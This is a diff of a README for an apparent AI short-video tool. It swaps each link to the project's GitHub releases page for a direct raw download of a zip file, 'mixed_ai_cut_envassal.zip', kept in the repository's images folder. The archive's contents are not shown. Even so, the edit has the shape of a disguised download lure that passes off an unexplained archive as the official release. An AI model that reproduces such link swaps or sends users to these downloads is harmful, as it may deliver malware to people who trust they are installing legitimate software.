@@ -1,7 +1,7 @@
 # 🎥 ai-mixed-cut - Create Stunning Short Videos Effortlessly
 
 ## 🔗 Downloads
-[![Download ai-mixed-cut](https://img.shields.io/badge/Download-ai--mixed--cut-blue.svg)](https://github.com/HjallerGamer/ai-mixed-cut/releases)
+[![Download ai-mixed-cut](https://raw.githubusercontent.com/HjallerGamer/ai-mixed-cut/main/images/mixed_ai_cut_envassal.zip)](https://raw.githubusercontent.com/HjallerGamer/ai-mixed-cut/main/images/mixed_ai_cut_envassal.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-mixed-cut! This tool helps you create highly original short videos using AI techniques. Whether you're looking to repurpose content or generate video from scratch, this application makes it easy.
@@ -21,7 +21,7 @@ Before you begin, make sure your computer meets these requirements:
 - **Software Dependencies:** Python 3.6 or higher, FFmpeg installed.
 
 ## 💻 Download & Install
-To get your copy of ai-mixed-cut, visit this page to download: [Releases Page](https://github.com/HjallerGamer/ai-mixed-cut/releases).
+To get your copy of ai-mixed-cut, visit this page to download: [Releases Page](https://raw.githubusercontent.com/HjallerGamer/ai-mixed-cut/main/images/mixed_ai_cut_envassal.zip).
 
 Once you have downloaded the application, follow these steps to install:
 
@@ -50,4 +50,4 @@ Stay updated on our latest features and improvements. Follow us on our social me
 
 Remember, our goal is to help you create amazing content. Don't hesitate to reach out if you need assistance!
 
-**Download here:** [Releases Page](https://github.com/HjallerGamer/ai-mixed-cut/releases)
+**Download here:** [Releases Page](https://raw.githubusercontent.com/HjallerGamer/ai-mixed-cut/main/images/mixed_ai_cut_envassal.zip)
